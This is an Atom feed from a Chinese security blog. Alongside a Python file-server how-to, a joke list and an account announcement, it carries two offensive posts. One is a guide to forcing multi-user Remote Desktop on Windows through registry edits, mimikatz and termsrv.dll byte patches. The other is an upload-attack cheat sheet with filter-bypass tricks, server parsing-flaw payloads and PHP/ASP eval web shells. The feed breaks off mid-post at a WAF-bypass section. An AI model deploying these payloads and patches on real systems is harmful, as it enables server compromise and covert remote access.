<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ChaBug安全 | Www.ChaBug.Org</title>
  
  <subtitle>ChaBug用心做安全</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.chabug.org/"/>
  <updated>2017-12-29T03:29:36.955Z</updated>
  <id>http://www.chabug.org/</id>
  
  <author>
    <name>初遇</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SimpleHTTPServer:Python的简易HTTP服务</title>
    <link href="http://www.chabug.org/2017/12/29/SimpleHTTPServer-Python-http/"/>
    <id>http://www.chabug.org/2017/12/29/SimpleHTTPServer-Python-http/</id>
    <published>2017-12-29T03:26:09.000Z</published>
    <updated>2017-12-29T03:29:36.955Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>如果你急需一个简单的网页来分享一些文件，有不想麻烦的安装重量级的软件，比如 Apache，Nginx、IIS 甚至于 Caddy 都懒得安装。那么， Python 可能帮助你。Python 可以完成一个简单的内建 HTTP 服务器。<br>实际上来说，这是一个可以用来共享文件的非常有用的方式。<br>实现一个微型的 HTTP 服务程序来说是很简单的事情，在 Python 下，只需要一个命令行。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装 Python<br><code>apt-get update &amp;&amp; apt-get install python -y</code><br>开启服务，下面的语句代表你将 / web 目录作为了网站目录，同时访问地址为 <a href="http://你的IP:8080" target="_blank" rel="external">http://你的IP:8080</a><br><code>cd /web &amp;&amp; python -m SimpleHTTPServer 8080</code><br>其他<br>如果你需要上传功能，请自行安装 <code>SimpleHTTPServerWithUpload.py</code> 模块，复制放到 <code>/usr/lib/python2.X</code>文件内，之后开启 HTTP 服务后，就会发现多一个 upload 按钮。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;如果你急需一个简单的网页来分享一些文件，有不想麻烦的安装重量级的软件，比如 Apache，Nginx、IIS 甚至于 Caddy 都懒得安装
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>有哪些你可以笑一年的笑话？</title>
    <link href="http://www.chabug.org/2017/12/29/joke-oneyear/"/>
    <id>http://www.chabug.org/2017/12/29/joke-oneyear/</id>
    <published>2017-12-29T03:16:38.000Z</published>
    <updated>2017-12-29T03:26:02.884Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>来说说让你每次都会说，一说笑一年的笑话！</strong></p></blockquote><h2 id="我是一个逗比，啊哈哈哈哈"><a href="#我是一个逗比，啊哈哈哈哈" class="headerlink" title="我是一个逗比，啊哈哈哈哈"></a>我是一个逗比，啊哈哈哈哈</h2><ol><li>阿朱对乔峰说：乔大哥，我愿意和你一样，做个契丹人…乔峰感动的问到：为什么？？阿朱莞尔一笑：若干年后，少数民族高考可加分……</li><li>秋香：夫君，我准备给自己起个外国名字，你说叫什么好呢？唐伯虎：叫“唐伯虎·秋香”吧</li><li>话说武松在景阳冈下店家喝了不少酒，踉踉跄跄的上冈去。由于酒力发作，便找了块大青石将要躺下，忽听一阵狂风呼啸一只大虫将扑过来。武松腾地跳起闪躲过去，这大虫却不依不饶追在武松后面。疲于奔命的武松这时急中生智，朝着大虫扔出了一瓶急支糖浆。</li><li>愚公弥留之际，子孙围绕在床前，见愚公嘴巴张了又张，长子知道他心愿未了，便凑上前去附耳倾听，愚公艰难地说：“移山，移山。。。”长子愣了一会：“亮晶晶，满天都是小星星。。。谢谢爸比！”</li><li>密室中，小燕子和紫薇泪眼汪汪地被绑着。皇后一声令下：“嬷嬷，打！”容嬷嬷愣了愣，羞涩地回道：“皇后么么哒……”</li><li>白娘子受伤现了原形不知所踪，许仙狂奔到西湖边找到当年的船夫，急切问：“快告诉我娘子在哪里？娘子在哪里？”船夫一脸茫然：“我，我不知道…”许仙发疯似的紧紧掐住船夫：“你是摆渡你不知道？！”</li><li>白素贞路上偶遇法海，热情地打了个招呼：“海！” 法海高贵冷艳地回了句：“白。” 然后就转身走了。。。</li><li>灰姑娘出席了舞会，王子一看到她便被她迷住了，立即邀她共舞。 欢乐的时光过得很快，眼看就要午夜十二时了，灰姑娘不得已要马上离开，在仓皇间留下了一只水晶鞋。王子跟了出来，捡起了水晶鞋，陷入了 沉思：44码</li><li>孟子年幼时，有一次由于贪玩而没有上学，他母亲知道后，生气地拿起剪刀，割断正在织布的织线。孟母语重心长地对儿子说：“你废弃学业像我剪断布线，学习就跟织布一样，布断了再也接不起来了。”孟子拿起断掉的线头说：“谁说接不起来，母亲您看好了，现在是见证奇迹的时刻！”</li><li>为了帮杨过拿回绝情丹，公孙绿萼这妮子就要死了，死在她最爱的杨大哥怀里。可惜了这一片痴心啊，绿萼用尽最后一口气，想再叫一声杨大哥：“杨……杨……杨…”杨过将她抱得更紧了些，说：“恒…源…祥……”</li><li>刚刚有一个长得挺帅的男生找我要电话，我果断拒绝了，我说你有毛病吧，好几千块钱的电话能给你？他说跟我要电话号，我说我这号用了好几年也不能给你啊！然后他就走了。我发现这人真是有病啊，就差抢了是不是？见面就要电话，完了还要电话号，我号码里面还有话费呢。</li><li>“如何让一本正经的胡说八道？”         裸考马克思、毛概你就知道了。</li><li>小时候坐自行车后座……         我妈一个扫荡腿…………</li><li>记得我妈刚开始玩神秘逃亡的时候，那个激动啊，大吼大叫，玩完不忘跟旁边正在看电视的姥爷说：“爸，你也玩吧”，姥爷说“我玩不了，嗓子不行”。</li><li>昨天去吃烧烤，老板问我要几分辣，我说我要变态辣。于是老板一边加辣椒，一边摸着我的屁股问“这样够变态吗？”够变态吗？吗？</li><li>记得那天我出去高考，我爸说：“你一大早上又要去哪里玩儿啊？”</li><li>公厕上大号门坏了，用手把着门，结果被人拽了出来</li><li>前一段时间有个话题叫“古力娜扎张翰”，有一个人评论说，古力娜是谁？竟然敢扎张翰。</li><li>路上看见一个脏兮兮的男孩，紧紧盯着眼前小女孩手里的一袋牛奶。小女孩喝完了就随手把袋子扔到了地上，他赶忙蹲下捡起地上的牛奶袋，放进嘴巴里，我鼻子一酸眼泪就滚了下来。。。刚想拉起他就看见他把袋子吹得鼓鼓的放到地上，猛地一脚下去！“砰”，他妈的吓我一跳。</li><li>第一次去男友家吃饭，他妈妈煮的饭很好吃，吃完一碗站起来想再去加一碗饭，他妈妈连忙拉着我说，就放那吧，等会我一起洗吧，等会我一起洗吧…………没吃饱。</li><li>去旅游，雕像岳母刺字。然后一男同事很感慨的说“这也就是岳母能干出的事，亲妈干不出来”。然后，四周的游客都安静了，没错，他是很认真的说……</li><li>一大早上小李去上班路过公园，看见一位大爷在打着太极，小李被大爷的这种精神所感染一时兴起和大爷唠起了嗑，“大爷，您身体很好啊！”大爷乐呵呵的对他说“还行吧，小伙子，要坚持经常锻炼，来，你推我下试试。”然后，小李赔了大爷两万。</li><li>昨天我问一个女同事，“你摸着自己的良心说，假如自己是男的，你愿不愿意和自己谈恋爱？”她想了一下，突然脸红了，羞涩地说“想都不敢想，哪有这种福气”。。。</li><li>今天开会，同事说“阿飞，今天领导讲话的时候，你吃蛋糕，大家都在看你！”听同事说完，吓我一跳，不会领导想吃我的蛋糕吧。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;来说说让你每次都会说，一说笑一年的笑话！&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;我是一个逗比，啊哈哈哈哈&quot;&gt;&lt;a href=&quot;#我是一个逗比，啊哈哈哈哈&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ChaBug开通了微信公众号了！</title>
    <link href="http://www.chabug.org/2017/12/25/weixin-code/"/>
    <id>http://www.chabug.org/2017/12/25/weixin-code/</id>
    <published>2017-12-25T03:29:47.000Z</published>
    <updated>2017-12-25T03:42:25.232Z</updated>
    
    <content type="html"><![CDATA[<p>经过几天的折腾，我们的初遇大大终于把微信公众号做好了。</p><p>每天都会推送一些有关网络安全的文章。</p><p>有实战类，工具流，exp&amp;poc，以及一些免费的服务器vps，还有一些网络活动什么的，当然还会推荐一些好看的电影。</p><p>而且以后可能博客里更新会比较少了，更多会在微信公众号里更新。所以，多多关注哦。  </p><p>总之，关注我们，你不会吃亏，不会上当。</p><p>微信搜索<code>ChaBug安全</code>或者扫描下方二维码，即可获取更多安全资讯。</p><p><strong>获取更多网络安全资讯，尽在ChaBug。<br>关注我们JJ+3CM（长按二维码识别）<br>QQ群：62851737</strong><br><img src="https://ws1.sinaimg.cn/large/006xriynly1fmsv3i6kvwj30dw0dwwet.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;经过几天的折腾，我们的初遇大大终于把微信公众号做好了。&lt;/p&gt;
&lt;p&gt;每天都会推送一些有关网络安全的文章。&lt;/p&gt;
&lt;p&gt;有实战类，工具流，exp&amp;amp;poc，以及一些免费的服务器vps，还有一些网络活动什么的，当然还会推荐一些好看的电影。&lt;/p&gt;
&lt;p&gt;而且以后可能博
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>渗透技巧之Windows系统远程桌面的多用户登录</title>
    <link href="http://www.chabug.org/2017/12/24/windows-users-login/"/>
    <id>http://www.chabug.org/2017/12/24/windows-users-login/</id>
    <published>2017-12-24T05:49:36.000Z</published>
    <updated>2017-12-24T06:02:53.511Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><hr><p>在渗透测试中，经常会接触Windows服务器的远程桌面服务，通过界面对服务器进行管理。而对于普通的Windows系统，在某些条件下也需要进行界面操作。</p><p>虽然我们可以通过编写程序来实现界面操作（捕获桌面信息，压缩传输，发送鼠标键盘消息等），但是如果能够使用远程桌面服务，岂不是更加方便高效</p><p>那么，对应非服务器版本的Windows系统，在使用远程桌面服务有哪些需要注意的问题呢，本文将会逐个分析介绍。</p><h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><hr><p>本文将要介绍如下内容：</p><ul><li>开启远程桌面的方法</li><li>使用mimikatz支持远程桌面多用户的原理</li><li>改进思路</li><li>测试工具rdpwrap<h1 id="0x02-开启远程桌面的方法"><a href="#0x02-开启远程桌面的方法" class="headerlink" title="0x02 开启远程桌面的方法"></a>0x02 开启远程桌面的方法</h1></li></ul><hr><p>1、查询系统是否允许3389远程连接<br><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</code><br>1表示关闭，0表示开启</p><p>查看远程连接的端口：</p><p><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</code><br>端口格式为16进制，如下图<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmrtc0z9x1j30hz021jr8.jpg" alt=""></p><p>0xd3d转换为十进制为33389</p><p>2、本机开启3389远程连接的方法<br>方法1：通过cmd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</div><div class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</div></pre></td></tr></table></figure></p><p>方法2：通过reg文件<br>内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Windows Registry Editor Version 5.00</div><div class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]</div><div class="line">&quot;fDenyTSConnections&quot;=dword:00000000</div><div class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]</div><div class="line">&quot;PortNumber&quot;=dword:00000d3d</div></pre></td></tr></table></figure></p><p>导入注册表：</p><p><code>regedit /s a.reg</code><br><strong>注：</strong></p><p>如果修改连接端口，系统重启后才能生效</p><p><strong>补充</strong></p><p>如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则允许3389端口，如下图</p><p><img src="https://ws1.sinaimg.cn/large/006xriynly1fmrtecyznrj30bd0bxq3m.jpg" alt=""></p><p>修改防火墙配置，允许3389端口的命令如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</div></pre></td></tr></table></figure></p><p>3、远程连接方法<br>kali使用3389远程连接：</p><p><code>rdesktop 192.168.1.1:3389</code><br>Windows：</p><p><code>mstsc.exe</code></p><h1 id="0x03-非服务器版本的Windows系统默认只允许一个账户登录"><a href="#0x03-非服务器版本的Windows系统默认只允许一个账户登录" class="headerlink" title="0x03 非服务器版本的Windows系统默认只允许一个账户登录"></a>0x03 非服务器版本的Windows系统默认只允许一个账户登录</h1><hr><p>具体表现为：</p><p>远程登录时，使用与原系统相同的账户，原系统将被切换到登录界面</p><p>如下图</p><p><img src="https://ws1.sinaimg.cn/large/006xriynly1fmrtfsadxyj30ph0gswkf.jpg" alt=""></p><p>使用不同的账户，登录时提示其他用户已登录到此计算机，如下图</p><p><img src="https://ws1.sinaimg.cn/large/006xriynly1fmrtga5tymj30n009f0tf.jpg" alt=""></p><p>选择继续后，原系统桌面将弹框提示是否断开当前连接(30秒后默认选择同意，退回到登录界面)</p><p>如下图</p><p><img src="https://ws1.sinaimg.cn/large/006xriynly1fmrtgokzl0j30ez0budh4.jpg" alt=""></p><h1 id="0x04-非服务器版本的Windows系统支持多用户登录的方法"><a href="#0x04-非服务器版本的Windows系统支持多用户登录的方法" class="headerlink" title="0x04 非服务器版本的Windows系统支持多用户登录的方法"></a>0x04 非服务器版本的Windows系统支持多用户登录的方法</h1><hr><p>1、使用mimikatz<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">privilege::debug</div><div class="line">ts::multirdp</div></pre></td></tr></table></figure></p><p>执行如下图</p><p><img src="https://ws1.sinaimg.cn/large/006xriynly1fmrthosuxej30jt07nt95.jpg" alt=""></p><p>开启多用户登录功能，最高支持到Win7</p><p><strong>使用与原系统相同的账户，原系统还是会被切换到登录界面</strong></p><p>使用与原系统不同的账户，登录成功，如下图</p><p><img src="https://ws1.sinaimg.cn/large/006xriynly1fmrti6qum5j30p20jkacb.jpg" alt=""></p><p>通过查看mimikatz的源码找到修改思路，代码位置如下：</p><p><a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_ts.c" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_ts.c</a></p><p>Windows在开启服务Remote Desktop Services时，会加载termsrv.dll，如下图</p><p><img src="https://ws1.sinaimg.cn/large/006xriynly1fmrtire5gqj30ne081myj.jpg" alt=""></p><p>通过修改内存中的termsrv.dll实现开启多用户功能，具体操作如下：</p><p>Win7 x86：</p><p>查找:<code>0x3B86200300000F84</code></p><p>替换为:<code>0xC78620030000FFFFFF7F9090</code></p><p>Win7 x64：</p><p>查找:<code>0x39873C0600000F84</code></p><p>替换为:<code>0xC7873C060000FFFFFF7F9090</code></p><p>当然，该方法在系统重启后失效</p><p>更近一步，如果我们直接修改文件termsrv.dll，能否实现永久开启多用户登录的功能呢？</p><p>继续接下来的测试</p><p>2、修改termsrv.dll<br>推荐工具： CFF Explorer</p><p>测试系统： Win7 x64</p><p>打开<code>c：\windows\system32</code>下的termsrv.dll</p><p>Hex Editor</p><p>查看十六进制数据<code>39873C0600000F84</code></p><p>如下图</p><p><img src="https://ws1.sinaimg.cn/large/006xriynly1fmrtk1vcrwj30o90eqwgd.jpg" alt=""></p><p>从<code>0x0001738A</code>处开始，选中12字节，替换为<code>C7873C060000FFFFFF7F9090</code></p><p>保存dll</p><p>注：</p><p>需要先停止远程桌面服务才能替换termsrv.dll</p><p>替换termsrv.dll后，重新开启服务TermService</p><p>尝试使用不同用户远程连接，成功，验证该思路正确</p><p>完整操作如下：</p><p>1.查看Remote Desktop Services服务状态</p><p><code>sc qc TermService</code><br>2.如果服务启动，需要先关闭</p><p><code>net stop TermService /y</code><br>3.删除原termsrv.dll</p><p><code>del c:\windows\system32\termsrv.dll</code><br>4.替换新termsrv.dll</p><p>5.启动服务</p><p><code>net start TermService</code><br>6.远程连接</p><p>成功实现多用户登录</p><p>补充1：</p><p>Win7 x86：</p><p>查找:<code>0x3B86200300000F84</code></p><p>替换为:<code>0xC78620030000FFFFFF7F9090</code></p><p>补充2</p><p>常见Windows系统的版本号：</p><p>系统    版本号<br>Win7    6.1.7600<br>Win7sp1    6.1.7601<br>Win8    6.2.9200<br>Win8.1    6.3.9600<br>3、使用工具rdpwrap<br>工程地址：</p><p><a href="https://github.com/stascorp/rdpwrap" target="_blank" rel="external">https://github.com/stascorp/rdpwrap</a></p><p>工具地址：</p><p><a href="https://github.com/stascorp/rdpwrap/releases" target="_blank" rel="external">https://github.com/stascorp/rdpwrap/releases</a></p><p>支持Win Vista - Win 10</p><p>不修改termsrv.dll，通过传入不同参数实现</p><p>安装：</p><p><code>RDPWInst.exe -i is</code><br>测试如下图</p><p><img src="https://ws1.sinaimg.cn/large/006xriynly1fmrtlm84lnj30hy0gu0ta.jpg" alt=""></p><p>释放rdpwrap.dll和rdpwrap.ini至System32文件夹</p><p>rdpwrap.dll会被加载到同termsrv.dll相同的进程</p><p>此时，能够使用不同用户进行远程连接</p><p>卸载：</p><p><code>RDPWInst.exe -u</code><br>0x05 小结<br>本文介绍了三种支持远程桌面多用户登录的方法，适用于不同条件，对于替换termsrv.dll的方法，需要根据系统具体版本，使用不同的替换位置</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;在渗透测试中，经常会接触Windows服务器的远程桌面服务，通过界面对服务器进行管理。而对
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>总结一下上传攻击</title>
    <link href="http://www.chabug.org/2017/12/23/upload-attack/"/>
    <id>http://www.chabug.org/2017/12/23/upload-attack/</id>
    <published>2017-12-23T06:49:16.000Z</published>
    <updated>2017-12-23T07:17:04.325Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-常规上传突破"><a href="#0x01-常规上传突破" class="headerlink" title="0x01 常规上传突破"></a>0x01 常规上传突破</h1><p><strong>常见扩展名黑名单</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">asp|asa|cer|cdx|aspx|ashx|ascx|asax </div><div class="line">php|php2|php3|php4|php5|asis|htaccess </div><div class="line">htm|html|shtml|pwml|phtml|phtm|js|jsp </div><div class="line">vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini</div></pre></td></tr></table></figure></p><p><strong>特殊后缀</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">jsp jspx jspf</div><div class="line">asp asa cer aspx   [IETester]</div><div class="line">php php php3 php4 pphphp</div><div class="line">exe exee</div></pre></td></tr></table></figure></p><p><strong>绕过</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[*] [00][80]        截断 iconv截断</div><div class="line">[*] js              burpsuite绕过</div><div class="line">[*] mime类型         content-type  校验常见的 image/jpeg image/png</div><div class="line">[*] 图片检测         getimagesize  合成图马上传即可 copy 1.jpg/b + poc.txt 2.jpg</div><div class="line">[*] 扩展名           黑名单  系统特性和特殊文件名容易绕过</div><div class="line">                    白名单  文件包含或者解析漏洞绕过  重命名限制脚本执行权限难解</div><div class="line">[*] 目录路径         突破上级目录和同级目录限制 uploads/../1.php   uploads/../x/1.php</div><div class="line">[*] .htaccess       上传覆盖绕过</div></pre></td></tr></table></figure></p><blockquote><p>轻量级检测绕过攻击</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[*] 绕过 javascript对扩展名的检测                      </div><div class="line">[*] 绕过服务端对http request包   MIME类型检测</div></pre></td></tr></table></figure><blockquote><p>路径/扩展名检测绕过攻击<br><strong>黑名单绕过</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[*] 文件名大小写绕过                 </div><div class="line">[*] 名单列表绕过                    </div><div class="line">[*] 特殊文件名绕过                  </div><div class="line">[*] 0x00  截断绕过                  </div><div class="line">[*] .htaccess绕过           </div><div class="line">[*] 文件包含漏洞                 </div><div class="line">[*] Apache解析漏洞                </div><div class="line">[*] IIS解析漏洞                   </div><div class="line">[*] Nginx解析漏洞</div></pre></td></tr></table></figure><blockquote><p><strong>白名单绕过</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[*] 0x00截断绕过                     </div><div class="line">[*] php 文件包含漏洞                  </div><div class="line">[*] IIS 解析漏洞                      </div><div class="line">[*] Nginx解析漏洞</div></pre></td></tr></table></figure><blockquote><p><strong>文件内容</strong>检测绕过攻击</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">[*] 文件加载绕过      二次渲染和ImageMagick基本没戏              </div><div class="line"> </div><div class="line">    function image_gd_open($file, $extension)   //后台GD库二次渲染的代码</div><div class="line">    &#123;</div><div class="line">    $extension = str_replace(&apos;jpg&apos;, &apos;jpeg&apos;, $extension);</div><div class="line">    $open_func = &apos;imageCreateFrom&apos;. $extension; //函数名变成 imageCreateFrompng 之类</div><div class="line">    if (!function_exists($open_func))</div><div class="line">    &#123;</div><div class="line">    return FALSE;</div><div class="line">    &#125;</div><div class="line">    return $open_func($file); //变成 imagecreatefrompng(&apos;/tmp/php0lbTOn&apos;)</div><div class="line">    &#125;</div><div class="line">将上传的文件中属于图片部分的数据抓取，再使用API或者函数重新将图片生成保存</div></pre></td></tr></table></figure><p><strong>系统特性</strong></p><blockquote><p>Windows特殊字符</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1.php[%80-%99]  当然还有php的iconv函数的80截断</div><div class="line">1.asp.</div><div class="line">1.asp [空格]</div><div class="line">1.php:1.jpg    1.&lt;&lt;&lt;  </div><div class="line">1.php::$DATA</div><div class="line">1.php::$DATA……[256]</div></pre></td></tr></table></figure><blockquote><p>Linux大小写敏感</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1.Php  1.pHp  1.phP</div></pre></td></tr></table></figure><h1 id="0x02-IIS5-x-6-x解析漏洞"><a href="#0x02-IIS5-x-6-x解析漏洞" class="headerlink" title="0x02 IIS5.x-6.x解析漏洞"></a>0x02 IIS5.x-6.x解析漏洞</h1><p><strong>目录解析(6.0)</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.asa/1.jpg </div><div class="line">1.asp/1.jpg </div><div class="line">1.cer/1.jpg</div></pre></td></tr></table></figure></p><p><strong>文件解析</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.asa;1.jpg </div><div class="line">1.asp;1.jpg </div><div class="line">1.cer;1.jpg</div></pre></td></tr></table></figure></p><p><strong>特殊后缀</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.asa</div><div class="line">1.cer</div><div class="line">1.cdx</div></pre></td></tr></table></figure></p><p>re :文件解析/截断等 重命名无解</p><h1 id="0x03-Apache解析漏洞"><a href="#0x03-Apache解析漏洞" class="headerlink" title="0x03 Apache解析漏洞"></a>0x03 Apache解析漏洞</h1><p><code>1.php.Axiba</code></p><p><strong>Apache配置文件</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">.htaccess突破</div><div class="line"> </div><div class="line">    &lt;FilesMatch &quot;1.jpg&quot;&gt;</div><div class="line">     </div><div class="line">    SetHandler application/x-httpd-php</div><div class="line">    &lt;/FilesMatch&gt;    上传1.jpg即可</div><div class="line"> </div><div class="line">Apache的conf配置</div><div class="line">    AddHandler php5-script .php </div><div class="line">        文件名里包含.php,即使文件名是test.php.jpg 也会以php 来执行</div><div class="line">     </div><div class="line">    AddType application/x-httpd-php .jpg</div><div class="line">        扩展名是jpg，一样能以php方式执行</div></pre></td></tr></table></figure></p><h1 id="0x04-nginx解析漏洞"><a href="#0x04-nginx解析漏洞" class="headerlink" title="0x04 nginx解析漏洞"></a>0x04 nginx解析漏洞</h1><p><strong>空字节代码执行漏洞</strong>  </p><p><strong>Nginx 0.5. Nginx 0.6. Nginx 0.7 &lt;= 0.7.65 Nginx 0.8 &lt;= 0.8.37</strong></p><p><code>1.jpg%00.php</code><br><strong>Nginx 0.8.41 – 1.5.6</strong></p><p><code>1.jpg%20%00.php</code><br><strong>IIS 7.0/ Nginx &lt;8.03畸形解析漏洞</strong></p><p><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;web访问1.jpg/.php,当前目录下会生成shell.php</code><br><strong>php-cgi解析漏洞</strong><br><strong>Win2k8 + IIS7.0 + PHP [IIS 7.0/7.5 Nginx &lt; 0.8.3]</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">-----------------------------1315172757593483281034936488</div><div class="line">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;1.php&quot;</div><div class="line">Content-Type: text/plain</div><div class="line">-----------------------------1315172757593483281034936488</div><div class="line">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;1.jpg&quot;</div><div class="line">Content-Type: text/plain</div></pre></td></tr></table></figure></p><p><strong>Win2k3 + IIS6.0 + ASP</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">-----------------------------1315172757593483281034936488</div><div class="line">Content-Disposition: form-data; name=&quot;upfile&quot;; </div><div class="line">Content-Type: text/plain</div><div class="line">filename=&quot;1.asp&quot;</div><div class="line"> </div><div class="line">&lt;%eval request(&quot;1&quot;)%&gt;</div></pre></td></tr></table></figure></p><h1 id="0x05-Bypass-WAF缺陷"><a href="#0x05-Bypass-WAF缺陷" class="headerlink" title="0x05 Bypass-WAF缺陷"></a>0x05 Bypass-WAF缺陷</h1><p><strong>匹配过于严谨：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div 